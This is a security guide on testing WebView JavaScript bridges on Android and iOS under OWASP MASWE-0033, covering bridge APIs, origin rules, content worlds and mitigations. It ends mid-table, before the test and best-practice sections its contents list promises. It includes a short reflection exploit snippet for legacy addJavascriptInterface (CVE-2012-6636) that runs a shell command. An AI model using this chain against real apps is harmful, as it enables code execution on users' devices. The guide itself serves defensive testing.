---
title: "Sensitive Native Functionality Exposed in WebViews (MASWE-0033)"
date: 2026-11-09 21:04:00 +0000
subcategory: platform
summary: "Testing WebView JavaScript bridges on Android and iOS: addJavascriptInterface, addWebMessageListener, WKScriptMessageHandler, content worlds, origins."
refs: [MASWE-0033, MASVS-PLATFORM-2, MASVS-STORAGE-2, CWE-749, CWE-94]
tags: [android, ios, masvs-platform, webview, javascript-bridge, hybrid-apps]
---

This note is part of our [MASVS-PLATFORM guide](/mobile/masvs-platform-platform-interaction-guide/) and covers OWASP [MASWE-0033](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0033/): native functionality handed to JavaScript running in a WebView. A bridge turns a web page into a caller of your app's own code, with your app's permissions, its Keychain or `SharedPreferences`, its session and its backend credentials. That is the point of a bridge, and it is also why it is the most valuable thing an attacker can find in a WebView: whoever runs script in a frame the bridge is exposed to inherits everything the bridge can do. Below you will find how each bridge mechanism works and where its trust boundary actually sits (Android `addJavascriptInterface`, `addWebMessageListener` and its origin rules, `postWebMessage` and message ports, `evaluateJavascript`; iOS `WKScriptMessageHandler`, `WKScriptMessageHandlerWithReply`, `WKUserScript`, `evaluateJavaScript` and `WKContentWorld`), where hybrid frameworks hide their bridges, the six OWASP tests with their demos, our runtime method for enumerating bridges and proving whether an untrusted origin can call them, secure patterns, and how to rate what you find.

## Contents

- [Overview](#overview)
- [Modes of Introduction](#modes-of-introduction)
- [Impact](#impact)
- [Mitigations](#mitigations)
- [Knowledge](#knowledge)
  - [Android: WebView-native bridges (MASTG-KNOW-0018)](#android-webview-native-bridges-mastg-know-0018)
  - [iOS: WebView-native bridges (MASTG-KNOW-0076)](#ios-webview-native-bridges-mastg-know-0076)
  - [iOS: WKContentWorld (MASTG-KNOW-0139)](#ios-wkcontentworld-mastg-know-0139)
  - [Hybrid frameworks: where the bridge lives (supplementary)](#hybrid-frameworks-where-the-bridge-lives-supplementary)
- [Tests](#tests)
  - [Before you start: inventory every WebView and bridge](#before-you-start-inventory-every-webview-and-bridge)
  - [MASTG-TEST-0334: Native Code Exposed Through WebViews (Android)](#mastg-test-0334-native-code-exposed-through-webviews-android)
  - [MASTG-TEST-0376: References to Native Bridge APIs in WebViews (iOS)](#mastg-test-0376-references-to-native-bridge-apis-in-webviews-ios)
  - [MASTG-TEST-0377: References to evaluateJavaScript Used as Bridge Reply in WKScriptMessageHandler (iOS)](#mastg-test-0377-references-to-evaluatejavascript-used-as-bridge-reply-in-wkscriptmessagehandler-ios)
  - [MASTG-TEST-0378: References to Password Fields in WebView-Loaded HTML (iOS)](#mastg-test-0378-references-to-password-fields-in-webview-loaded-html-ios)
  - [MASTG-TEST-0379: References to evaluateJavaScript Without Content World Isolation (iOS)](#mastg-test-0379-references-to-evaluatejavascript-without-content-world-isolation-ios)
  - [MASTG-TEST-0380: References to evaluateJavaScript Writing Sensitive Data into WebView DOM (iOS)](#mastg-test-0380-references-to-evaluatejavascript-writing-sensitive-data-into-webview-dom-ios)
  - [GT-0033-1: Enumerating and calling bridges at runtime and proving origin restriction (Android and iOS)](#gt-0033-1-enumerating-and-calling-bridges-at-runtime-and-proving-origin-restriction-android-and-ios)
  - [GT-0033-2: Native-to-page data flows on Android (Android)](#gt-0033-2-native-to-page-data-flows-on-android-android)
- [Best practices](#best-practices)
  - [MASTG-BEST-0035: Prefer Origin Scoped Messaging Over Legacy JavaScript Bridges](#mastg-best-0035-prefer-origin-scoped-messaging-over-legacy-javascript-bridges)
  - [MASTG-BEST-0058: Restrict Native Functionality Exposed Through WebView Bridges](#mastg-best-0058-restrict-native-functionality-exposed-through-webview-bridges)
  - [MASTG-BEST-0062: Use WKScriptMessageHandlerWithReply to Return Data to JavaScript](#mastg-best-0062-use-wkscriptmessagehandlerwithreply-to-return-data-to-javascript)
  - [MASTG-BEST-0061: Use WKContentWorld Isolation for DOM Inspection Scripts](#mastg-best-0061-use-wkcontentworld-isolation-for-dom-inspection-scripts)
  - [MASTG-BEST-0059: Render Sensitive UI as Native Views Over the WebView](#mastg-best-0059-render-sensitive-ui-as-native-views-over-the-webview)
  - [MASTG-BEST-0060: Use Native Views for Sensitive Text Entry Over a WebView](#mastg-best-0060-use-native-views-for-sensitive-text-entry-over-a-webview)
  - [MASTG-BEST-0012: Disable JavaScript in WebViews](#mastg-best-0012-disable-javascript-in-webviews)
  - [Secure patterns (Guler Tech)](#secure-patterns-guler-tech)
- [Rating findings](#rating-findings)
- [References](#references)

## Overview

MASWE-0033 applies when an app exposes sensitive native functionality to content loaded in its WebViews, almost always through a JavaScript bridge. The OWASP requirement is *"The app does not expose sensitive native functionality to WebView content."* It maps to MASVS-PLATFORM-2 ("The app uses WebViews securely"), to MASVS-STORAGE-2 (because the most common thing a bridge leaks is stored data), to MASVS v1 MSTG-PLATFORM-7, and to two CWEs: [CWE-749](https://cwe.mitre.org/data/definitions/749.html) (Exposed Dangerous Method or Function) and [CWE-94](https://cwe.mitre.org/data/definitions/94.html) (Improper Control of Generation of Code), the latter for the classic `addJavascriptInterface` reflection attack and for native code that builds JavaScript strings out of data. Android's own risk catalogue calls it [insecure WebView native bridges](https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges), and the Android core app quality guidelines carry it as `WebView_JavaScript`. Profiles: L1, L2 and EUDIW, so it is a baseline expectation.

OWASP describes the threat as MAS-THREAT-0033, *"Attackers can invoke exposed native functionality from web content"*, reached through two attacks: MAS-ATTACK-0047, delivering crafted deep links or intents from a malicious app or web page (which is how attacker URLs end up loaded in the WebView), and MAS-ATTACK-0051, injecting malicious JavaScript into WebView content (through a machine-in-the-middle on insecure connections, a compromised third-party script, or XSS in the trusted site). Neither attack is about the bridge itself; they are about getting script into a frame where the bridge is. That is why every bridge finding has two halves, and you need both to rate it:

1. **What does the bridge do?** Read a token, return personal data, write preferences, open files, send messages, make payments, start activities, change security settings? A bridge that only reports a button tap is not sensitive; a bridge that returns the session token is.
2. **Who can reach it?** Only the app's own bundled pages, in the main frame, with no third-party scripts? Any frame of any origin the WebView happens to display? Every page after the user taps a link?

> **Note:** The MASWE-0033 page has no OWASP tests of its own. OWASP files the bridge tests under [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/), which is about local file and content access. We document them here, because they test bridges: Android MASTG-TEST-0334 and iOS MASTG-TEST-0376 to 0380. The MASWE-0034 note keeps a pointer back to this one.

How this note splits the WebView material with its siblings:

| Question | Where it lives |
|---|---|
| What can a page call in native code, and can untrusted content reach it? | This note (MASWE-0033) |
| Can WebView content read local files and content providers (`setAllowFileAccess`, `allowingReadAccessTo`, `WebViewAssetLoader`)? General WebView configuration and defaults | [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) |
| How does attacker content get into the WebView at all (URL loading from intents and deep links, open redirects, navigation control, XSS, mixed content)? | [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/) |
| WebView TLS error handling and cleartext | [MASWE-0027](/mobile/maswe-0027-insecure-certificate-validation/), [MASWE-0026](/mobile/maswe-0026-cleartext-network-traffic/) |
| Intents and deep links that deliver the URL | [MASWE-0032](/mobile/maswe-0032-insecure-intents/), [MASWE-0029](/mobile/maswe-0029-insecure-deep-links/) |

## Modes of Introduction

**A bridge on a WebView that shows more than the app's own content.** The bridge was designed for the app's bundled checkout page, but the same WebView also renders help articles, marketing pages, a support chat widget, or whatever URL a push notification or deep link supplies. Once the WebView follows a link or loads an external URL, the bridge is still attached. With `addJavascriptInterface` it is attached to every page and every frame; with an iOS message handler registered through `add(_:name:)` it is defined in every frame too.

**No origin check, or a check that cannot work.** Android's legacy bridge offers no origin information at all, so developers read `WebView.getUrl()` inside the method. That is the main-frame URL at some moment, not the frame that called, and the call runs on a background thread where WebView methods may not be called directly. On iOS the origin is available in `WKScriptMessage.frameInfo.securityOrigin`, but many handlers never read it, or compare hosts with `hasSuffix("example.com")`, which also matches `evilexample.com`.

**Wide origin rules.** `addWebMessageListener` with `"*"`, with `http://` origins (any network attacker can be that origin), or with `https://*.example.com` when some subdomain hosts user content, a third-party help desk, or a dangling CNAME.

**Generic dispatchers.** One bridge method `exec(command, argsJson)` that routes to dozens of native functions, or a "plugin" system where the web layer can call any registered plugin. Every new plugin silently extends the attack surface of every page.

**Unvalidated messages.** The handler trusts the action name, the arguments, and the app state: a `url` argument is opened without checking its scheme, a `path` argument reaches `File()`, a JSON body is cast without type checks, a "logout" action is accepted from any frame.

**Bridge glue in the page world.** On iOS the app injects a helper script (a `WKUserScript` without a content world) that wraps `postMessage` and holds callbacks in globals; page scripts, including third-party analytics, can read, replace or call those globals. The same applies to replies delivered through `evaluateJavaScript("window.callback('…')")`, which page code can intercept by redefining the callback.

**Sensitive data pushed into the page.** Native code writes a one-time password, account number or token into the DOM with `evaluateJavaScript`/`evaluateJavascript`, or renders a password field in HTML. No bridge call is needed to read it: any script on the page can.

**Over-exposed bridges.** A bridge object that exposes far more than the pages need: returning a whole user profile object when the page needs the first name, or returning a Java object whose own annotated methods then become callable too.

**Legacy platform behaviour.** An app with `targetSdkVersion` below 17 (or running on Android below 4.2) exposes every public method of the injected object, including `getClass()`, which leads to arbitrary code execution through reflection.

## Impact

- **Compromise of sensitive data.** Bridge methods that return tokens, credentials, personal data, files or device identifiers hand them to the calling script, which can send them anywhere with `fetch`.
- **Execution of unauthorised actions in the app's context.** The attacker acts as the app: sends messages, changes settings, starts payments, writes to storage, launches other components, requests runtime permissions the app holds (camera, location, contacts).
- **Code execution.** On legacy Android targets, reflection through `addJavascriptInterface` yields shell commands as the app's UID; on current platforms, bridges that load code, write to code-loading paths or evaluate strings can still get there.
- **Integrity of security decisions.** Native code that reads values back from the page (MASTG-TEST-0379) can be fed attacker-chosen data and act on it.

## Mitigations

- **Do not attach a bridge to a WebView that can display content you do not control.** If the WebView must show external content, give that content a separate WebView with JavaScript disabled or no bridge, or open it in Custom Tabs / `SFSafariViewController`.
- **Expose narrow, purpose-built methods.** No generic dispatchers, no methods returning whole objects, no "run this command" entry points. Remove bridges when the screen that needs them is gone.
- **Scope bridges to origins and frames.** On Android use `WebViewCompat.addWebMessageListener` with a short list of `https://` origin rules and check `sourceOrigin` and `isMainFrame` in the callback. On iOS check `message.frameInfo.isMainFrame` and `message.frameInfo.securityOrigin` in every handler, and consider app-bound domains.
- **Validate every message** as untrusted input: type, structure, allowed values, and whether the action makes sense in the current app state and authentication state.
- **Keep sensitive data out of the page.** Return it only when necessary, over `WKScriptMessageHandlerWithReply` or a reply proxy rather than through page-world callbacks, and render secrets and secret input in native views.
- **Isolate app-owned scripts** in a named execution world: `WKContentWorld` on iOS 14+, `JavaScriptExecutionWorld` on Android where the WebView supports it. Isolation is not authorisation: keep origin checks and validation in place.
- **Close the entry points**: navigation allowlists, HTTPS only, no URLs from intents or deep links without validation ([MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/)).

## Knowledge

OWASP links three Knowledge pages to these tests: MASTG-KNOW-0018 (Android WebViews), MASTG-KNOW-0076 (iOS WebViews) and MASTG-KNOW-0139 (WKContentWorld). The first two are general WebView pages; we cover their bridge sections here and leave URL loading, file access, storage and network settings to the [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/). We add a supplementary section on hybrid frameworks, because in Cordova, Capacitor, React Native and Flutter apps the bridge is not in the app's own code and the OWASP tests will not find it by name.

### Android: WebView-native bridges (MASTG-KNOW-0018)

Source: [MASTG-KNOW-0018](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/), section "WebView-Native bridges", verified against Android's [Access native APIs with JavaScript bridge](https://developer.android.com/develop/ui/views/layout/webapps/native-api-access-jsbridge), the [`WebViewCompat`](https://developer.android.com/reference/androidx/webkit/WebViewCompat) reference and [Insecure WebView native bridges](https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges).

Android has three bridge APIs in use today, plus native-to-page script evaluation. Google's own comparison:

| | `addWebMessageListener` | `postWebMessage` | `addJavascriptInterface` |
|---|---|---|---|
| Model | Asynchronous messages; listener runs on the main thread | Asynchronous messages | Synchronous method calls; run on a WebView background thread |
| Origin control | Allowlist of origin rules, enforced by WebView; sender origin reported | Target origin for messages sent to the page | None |
| Frames | Every frame whose origin matches the rules | Main frame only | Every frame, every origin |
| Direction | Bidirectional (reply proxy) | Bidirectional (message ports) | Web to app (returns values synchronously) |
| Minimum | WebView 82, Jetpack Webkit 1.3.0 | WebView 45, Jetpack Webkit 1.1.0 | All versions |
| Google's recommendation | Recommended | Alternative | Legacy, not recommended |

All three need JavaScript, which is off by default: the app must call `WebSettings.setJavaScriptEnabled(true)` (Kotlin: `settings.javaScriptEnabled = true`). A WebView with JavaScript disabled cannot call any bridge, which is why OWASP's first evaluation condition is the JavaScript flag.

#### addJavascriptInterface and @JavascriptInterface

The app creates an ordinary Kotlin or Java object, marks the methods it wants to expose with `@android.webkit.JavascriptInterface`, and injects it:

```kotlin
class SupportBridge(private val prefs: SharedPreferences) {
    @JavascriptInterface
    fun getDisplayName(): String = prefs.getString("name", "") ?: ""
}

webView.settings.javaScriptEnabled = true
webView.addJavascriptInterface(SupportBridge(prefs), "AppBridge")
webView.loadUrl("https://www.example.com/support")
```

The page then calls `window.AppBridge.getDisplayName()` and receives the string synchronously. What matters for testing:

- **Timing.** The object does not appear until the next page load after `addJavascriptInterface`, and it stays on the WebView until `removeJavascriptInterface(name)`. It survives navigation: every later page in that WebView, whatever its origin, sees it.
- **Frames.** It is injected into every frame, including cross-origin iframes (ads, embedded videos, third-party widgets). There is no origin check and no API to add one.
- **Threads and getUrl().** Bridge methods run on a private background thread. `WebView.getUrl()` must be called on the UI thread, returns the main frame's URL rather than the calling frame's, and can change between the call and the check. Google states explicitly that it cannot be used to authorise bridge calls. Code that does `if (webView.url?.startsWith("https://www.example.com") == true)` inside a bridge method is a weak control at best.
- **What is callable.** With `targetSdkVersion` 17 or higher, only `public` methods annotated with `@JavascriptInterface` are exposed (static ones too); fields are never exposed; annotations are not inherited by overriding methods; overloads are resolved only by argument count. Standard reflection such as `getClass()` is blocked and throws in JavaScript.
- **Type coercion.** Strings, numbers, booleans and one-dimensional arrays cross the bridge; JavaScript objects arrive as `null`, `undefined` arrives as the string `"undefined"`. A method that **returns a Java object** gives JavaScript a wrapper on which every `@JavascriptInterface` method of that object is callable, which can widen the surface beyond the injected class.
- **They survive obfuscation.** The page's JavaScript calls bridge methods by name, so apps have to keep those names (and the annotation) through R8 with keep rules, or the web side breaks. In a release build you can therefore grep for the annotation and read the real method names; whatever name jadx shows is the name JavaScript uses.

#### The API 17 reflection fix, and why you still check it

Before Android 4.2 (API 17), every public method of the injected object was callable, including the inherited `getClass()`. From there JavaScript could reach `java.lang.Runtime` and run commands as the app ([CVE-2012-6636](https://nvd.nist.gov/vuln/detail/CVE-2012-6636); MWR's 2013 write-up, linked from OWASP):

```javascript
// Works only against apps targeting API 16 or lower, or devices below Android 4.2
AppBridge.getClass().forName('java.lang.Runtime')
    .getMethod('getRuntime', null).invoke(null, null).exec(['id']);
```

The fix has two conditions: the device must run Android 4.2 or later **and** the app must target API 17 or later; an app targeting 16 or lower keeps the old behaviour on new devices. Android 4.x also injected its own bridge objects into WebViews (`searchBoxJavaBridge_`, [CVE-2014-1939](https://nvd.nist.gov/vuln/detail/CVE-2014-1939), and the accessibility bridges), which apps on those releases had to remove with `removeJavascriptInterface`. Google's risk page and OWASP's KNOW-0018 and BEST-0035 phrase the safe threshold as "target API level 21 or higher"; the `@JavascriptInterface` requirement itself arrived with API 17, so treat 17 as the technical boundary and 21 as the conservative recommendation. Current WebView builds also block `getClass()` on injected objects (Google lists it under reflection protection), but you cannot rely on the WebView version of every device that runs an old-target app. Today both conditions are almost always met (Google Play requires recent target levels), so this is a check, not a test: read `minSdkVersion` and `targetSdkVersion` from the manifest, and treat anything below 17 as Critical if a bridge exists.

#### addWebMessageListener and allowed-origin rules

`WebViewCompat.addWebMessageListener(webView, jsObjectName, allowedOriginRules, listener)` (AndroidX Webkit, check `WebViewFeature.isFeatureSupported(WebViewFeature.WEB_MESSAGE_LISTENER)`) injects a JavaScript object named `jsObjectName` into **every frame whose origin matches one of the rules**, from the moment the page starts loading, for every navigation after the call. Frames that do not match do not get the object at all. Register it before `loadUrl()`; pages already loaded do not get it.

The page uses `myObject.postMessage(data)` and receives replies on `myObject.onmessage` (or `addEventListener("message", …)`). The app's `onPostMessage(view, message, sourceOrigin, isMainFrame, replyProxy)` receives the message (a string or, with `WEB_MESSAGE_ARRAY_BUFFER`, a byte array), the origin of the sending frame as a `Uri`, whether that frame is the main frame, and a `JavaScriptReplyProxy` that posts back to that frame only. The listener runs on the UI thread.

Each rule has the form `SCHEME "://" [ HOSTNAME_PATTERN [ ":" PORT ] ]`:

| Rule | Matches | Watch for |
|---|---|---|
| `https://www.example.com` | That scheme, host and port (443 implied). Paths are ignored | Fine for most apps |
| `https://www.example.com:8443` | That host on port 8443 only | |
| `https://*.example.com` | Any subdomain at any depth (`a.example.com`, `a.b.example.com`), not `example.com` itself | Every subdomain is now trusted: user-content hosts, SaaS CNAMEs, takeover candidates |
| `http://…` | Plain HTTP origin | Anyone on the network path can be that origin; Google warns against it |
| `https://127.0.0.1`, `https://[::1]` | IP literals | |
| `my-app-scheme://` | A custom scheme; host and port must be absent | Check what can be loaded under that scheme |
| `*` | Every origin, every frame | Equivalent to `addJavascriptInterface` for reach; acceptable only if the bridge is meant for anyone |

Invalid rules throw `IllegalArgumentException`. Wildcards are only allowed as a leading `*.` on the host; you cannot wildcard the scheme or the middle of a name.

Pitfalls the origin check does **not** cover:

- **XSS or third-party script inside an allowed origin** runs *as* that origin. Google's page says that origin enforcement makes rigorous payload validation unnecessary "in most standard implementations"; we disagree for any sensitive action, because one XSS or one compromised analytics script in the trusted origin defeats it.
- **Origins the app manufactures.** `loadDataWithBaseURL("https://www.example.com/", html, …)` gives an HTML string the origin of the base URL. If that string contains untrusted data, the injected markup runs as a trusted origin. The same applies to content served under `https://appassets.androidplatform.net` by [`WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader) when the served files include downloaded or user-supplied content.
- **Frames.** Matching iframes get the object too. If the bridge is only meant for the top-level page, the listener must check `isMainFrame`.

Jetpack Webkit 1.16.0 adds an overload taking a [`JavaScriptExecutionWorld`](https://developer.android.com/reference/androidx/webkit/JavaScriptExecutionWorld) (feature `JS_INJECTION_IN_FRAME_AND_WORLD`), so the bridge object can be injected into an isolated world used by app scripts rather than the page world. This is the Android counterpart of iOS content worlds and needs a recent WebView; check for the feature at runtime.

#### postWebMessage and WebMessagePort

`WebViewCompat.postWebMessage(webView, message, targetOrigin)` delivers a `MessageEvent` to the **main frame** if its origin matches `targetOrigin`. For a two-way channel the app creates a `WebMessageChannel` (`WebViewCompat.createWebMessageChannel`), keeps one port and transfers the other inside the message; the page then talks over that port. It is origin-aware in one direction only: the page cannot verify that a message came from the app rather than from another frame, and content loaded through `data:`, `file:` or `loadData()` can only be targeted with `"*"`, which delivers to whatever page is in the main frame at that moment. Look for `Uri.parse("*")` or `Uri.EMPTY` as target origin, and for ports handed to pages that the app does not control.

#### evaluateJavascript and addDocumentStartJavaScript (native to page)

The app can also push script into the page: `WebView.evaluateJavascript(script, callback)` (API 19+) runs a string in the current main frame's page context and returns the result as JSON to the callback; `loadUrl("javascript:…")` is the older form. `WebViewCompat.addDocumentStartJavaScript(webView, script, allowedOriginRules)` (Jetpack Webkit 1.9.0, feature `DOCUMENT_START_SCRIPT`) runs a script at document start in every frame matching the rules, before page scripts, and returns a `ScriptHandler` for removal. These are not bridges in themselves, but they are how apps implement replies (`evaluateJavascript("onToken('" + token + "')")`) and how they write native data into pages, with the same two problems OWASP tests on iOS: page script can redefine the callback or read the DOM, and building script by string concatenation is a JavaScript injection sink when the data contains quotes. We test this on Android in [GT-0033-2](#gt-0033-2-native-to-page-data-flows-on-android-android).

#### Other channels that work as bridges

Not every bridge is called a bridge. During review, also treat these as bridge entry points:

- `WebViewClient.shouldOverrideUrlLoading` that interprets a custom scheme or magic URL (`app://pay?amount=…`) as a command.
- `WebChromeClient.onJsPrompt` / `onJsAlert` / `onConsoleMessage` used to carry commands from JavaScript (Cordova's fallback bridge uses `onJsPrompt`).
- `WebViewClient.shouldInterceptRequest` that answers requests to a fake host (`https://app.local/api/…`) with native data.
- `WebChromeClient.onPermissionRequest` that grants every requested resource (camera, microphone) to any origin, and `onGeolocationPermissionsShowPrompt` that grants location: these expose the app's runtime permissions to page script.

### iOS: WebView-native bridges (MASTG-KNOW-0076)

Source: [MASTG-KNOW-0076](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/), section "WebView-Native Bridges", extended with Apple's [`WKUserContentController`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller), [`WKScriptMessageHandler`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandler), [`WKScriptMessageHandlerWithReply`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandlerwithreply) and [`WKUserScript`](https://developer.apple.com/documentation/webkit/wkuserscript) references. OWASP's page describes only `add(_:name:)`; the other APIs below are what you will meet in current apps.

`WKWebView` is the only web view to consider: `UIWebView` was deprecated in iOS 12 and the App Store stopped accepting apps that use it in 2020. JavaScript is on by default; it is switched off per navigation with `WKWebpagePreferences.allowsContentJavaScript` (iOS 14+) or, in older code, `WKPreferences.javaScriptEnabled`. Every bridge API hangs off the `WKUserContentController` in the web view's `WKWebViewConfiguration`, which is shared by every web view created from that configuration.

#### WKScriptMessageHandler

```swift
final class BridgeHandler: NSObject, WKScriptMessageHandler {
    func userContentController(_ ucc: WKUserContentController,
                               didReceive message: WKScriptMessage) {
        // message.name, message.body, message.frameInfo, message.webView, message.world
    }
}

let config = WKWebViewConfiguration()
config.userContentController.add(BridgeHandler(), name: "bridge")
```

Registering a handler named `bridge` defines `window.webkit.messageHandlers.bridge.postMessage(body)` for page JavaScript. Facts that matter when you test:

- **Worlds and frames.** `add(_:name:)` always registers in the `.page` content world. The function is defined in every frame of every web view using that controller, including cross-origin iframes. There is no origin allowlist in the API.
- **What arrives.** `message.body` is the posted value converted to `NSNumber`, `NSString`, `NSDate`, `NSArray`, `NSDictionary` or `NSNull`. A handler that force-casts (`as!`) crashes on unexpected input, and a handler that takes `body["url"]` and opens it is an open-URL primitive.
- **Who sent it.** `message.frameInfo` is a [`WKFrameInfo`](https://developer.apple.com/documentation/webkit/wkframeinfo): `isMainFrame`, `request` (the frame's URL request) and `securityOrigin` (a `WKSecurityOrigin` with `protocol`, `host` and `port`). This is the only reliable sender information, and checking it is the app's job. Content loaded with `loadHTMLString(_:baseURL: nil)` has an opaque origin, so an origin check against it means nothing; content loaded with a real `baseURL` takes that origin.
- **Lifetime.** The controller holds the handler strongly. Handlers stay registered until `removeScriptMessageHandler(forName:)` or `removeAllScriptMessageHandlers()`; a configuration reused for an external-content web view carries them along.
- **Reply path.** `WKScriptMessageHandler` is one-way. Apps that need to return data either call `message.webView?.evaluateJavaScript("callback(…)")` (the pattern MASTG-TEST-0377 fails) or use the reply variant below.

#### WKScriptMessageHandlerWithReply

iOS 14 added [`WKScriptMessageHandlerWithReply`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandlerwithreply), registered with `addScriptMessageHandler(_:contentWorld:name:)`. In JavaScript, `postMessage` then returns a `Promise`. The handler receives a `replyHandler(reply, errorMessage)`: pass a value (`NSNumber`, `NSString`, `NSDate`, `NSArray`, `NSDictionary` or `NSNull`) and `nil` to resolve the promise, or `nil` and an error string to reject it. Call it once per message. The reply goes to the calling script in the calling world, so no global callback exists for page code to hijack. It does not restrict who can call: a reply handler registered in `.page` answers any page script, in any frame, so the same origin and frame checks apply.

#### WKUserScript

[`WKUserScript(source:injectionTime:forMainFrameOnly:)`](https://developer.apple.com/documentation/webkit/wkuserscript) adds a script that runs in every matching frame at `.atDocumentStart` (before page scripts, DOM not ready) or `.atDocumentEnd`, added with `userContentController.addUserScript(_:)`. `forMainFrameOnly: false` injects into iframes as well. Without a world the script runs in `.page`, so everything it defines (bridge wrappers, callback registries, tokens kept in variables) is visible to and replaceable by page JavaScript. The iOS 14 initialiser `WKUserScript(source:injectionTime:forMainFrameOnly:in:)` takes a `WKContentWorld`. App-injected scripts are a good place to look for secrets: extract them with `strings` from the binary or log them with Frida (see [GT-0033-1](#gt-0033-1-enumerating-and-calling-bridges-at-runtime-and-proving-origin-restriction-android-and-ios)).

#### evaluateJavaScript and callAsyncJavaScript

`evaluateJavaScript(_:completionHandler:)` (ObjC `evaluateJavaScript:completionHandler:`; the Swift `async` form compiles to the same selector) runs a string in the main frame's `.page` world and returns the result. iOS 14 added `evaluateJavaScript(_:in:in:completionHandler:)` (ObjC `evaluateJavaScript:inFrame:inContentWorld:completionHandler:`) to choose a frame and a world, and `callAsyncJavaScript(_:arguments:in:in:completionHandler:)`, which passes native values as named JavaScript arguments instead of interpolating them into the source string. That last point matters: `evaluateJavaScript("show('\(value)')")` is a script injection sink whenever `value` can contain a quote, and `callAsyncJavaScript` with `arguments: ["value": value]` is not.

#### App-bound domains

When an app declares `WKAppBoundDomains` in `Info.plist` (up to ten domains, iOS 14+), WebKit disables the APIs that inject JavaScript, user scripts and message handlers for content outside those domains; `limitsNavigationsToAppBoundDomains = true` on the configuration additionally stops navigation to other domains. Together they remove the "bridge on an external page" problem at the platform level. It is covered with navigation control in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/); when you see it, note that it limits the bridge's reach.

#### Legacy UIWebView bridges

For completeness, because old code and the legacy MASTG-TEST-0078 mention them: `UIWebView` exposed native code by assigning blocks to a `JSContext` obtained through `valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"`, or through classes adopting a `JSExport` protocol, whose declared members became visible to every script. Finding either in a current binary means a very old dependency.

### iOS: WKContentWorld (MASTG-KNOW-0139)

Source: [MASTG-KNOW-0139](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0139/) and Apple's [`WKContentWorld`](https://developer.apple.com/documentation/webkit/wkcontentworld). Available since iOS 14.

A content world is a separate JavaScript environment inside the same web view. There are three kinds: `.page` (the page's own environment, and the default for every legacy API), `.defaultClient` (a predefined isolated world for the app), and named worlds from `WKContentWorld.world(name:)` (ObjC `worldWithName:`), each isolated from the page and from each other.

**Isolated per world:** the global scope (variables, functions, `window` properties such as message handler bindings) and the built-in prototypes (`Object.prototype`, `Function.prototype`, `Element.prototype`, `document.querySelector`). A page that redefines `document.querySelector` changes it only in `.page`.

**Shared by all worlds:** the DOM. Elements, their `textContent`, `value` and attributes, and dispatched events are the same objects everywhere. Anything an isolated script writes into the DOM is readable by page script; anything page script writes into the DOM is what the isolated script reads.

The world-aware APIs, with the ObjC selectors you search for in a binary:

| Swift | ObjC selector | Default world of the legacy variant |
|---|---|---|
| `add(_:contentWorld:name:)` | `addScriptMessageHandler:contentWorld:name:` | `add(_:name:)` → `.page` |
| `addScriptMessageHandler(_:contentWorld:name:)` (with reply) | `addScriptMessageHandlerWithReply:contentWorld:name:` | (none, iOS 14+ only) |
| `WKUserScript(source:injectionTime:forMainFrameOnly:in:)` | `initWithSource:injectionTime:forMainFrameOnly:inContentWorld:` | `initWithSource:injectionTime:forMainFrameOnly:` → `.page` |
| `evaluateJavaScript(_:in:in:completionHandler:)` | `evaluateJavaScript:inFrame:inContentWorld:completionHandler:` | `evaluateJavaScript:completionHandler:` → `.page` |
| `callAsyncJavaScript(_:arguments:in:in:completionHandler:)` | `callAsyncJavaScript:arguments:inFrame:inContentWorld:completionHandler:` | (none) |

A handler registered in a named world is invisible to page script: `window.webkit.messageHandlers.<name>` is `undefined` in `.page`. That is the strongest reason to use worlds for app-owned bridges: page scripts, including third-party ones and XSS payloads, cannot even see the function. It is still not an origin check. Any script that runs in that world (the app's own user scripts) can call the handler from any frame it is injected into, and the data it relays may have come from the DOM, which the page controls.

### Hybrid frameworks: where the bridge lives (supplementary)

In hybrid apps the bridge belongs to the framework and every installed plugin is a bridge method. The OWASP grep for `addJavascriptInterface` or `add(_:name:)` lands in framework code; what you need is the plugin list and the framework's origin settings. Where to look:

| Framework | Android bridge | iOS bridge | What decides reach | Where to look |
|---|---|---|---|---|
| Apache Cordova | `addJavascriptInterface` object `_cordovaNative`, `onJsPrompt` fallback; JS calls `cordova.exec(success, fail, "Service", "action", args)` | `WKScriptMessageHandler` named `cordova` (cordova-ios 6+) | `<allow-navigation>` and `<access>` in `config.xml`; in current versions bridge access follows the navigation allowlist, so `<allow-navigation href="*"/>` hands every plugin to any page | Android `res/xml/config.xml`, iOS `config.xml` in the bundle, `www/cordova_plugins.js` for the installed plugins, each plugin's `execute(action, args, callbackContext)` |
| Capacitor | In current versions, `addWebMessageListener` object `androidBridge` when the WebView supports it (origin rules derived from the app's server URL and `server.allowNavigation`), falling back to `addJavascriptInterface` under the same name, or always with `android.useLegacyBridge` | `WKScriptMessageHandler` named `bridge` | `server.url`, `server.hostname`, `server.allowNavigation` in `capacitor.config.json` | Android `assets/capacitor.config.json` and `assets/capacitor.plugins.json`, iOS `App.app/capacitor.config.json`; plugin classes (`@CapacitorPlugin` / `@PluginMethod`, `CAPPlugin`) |
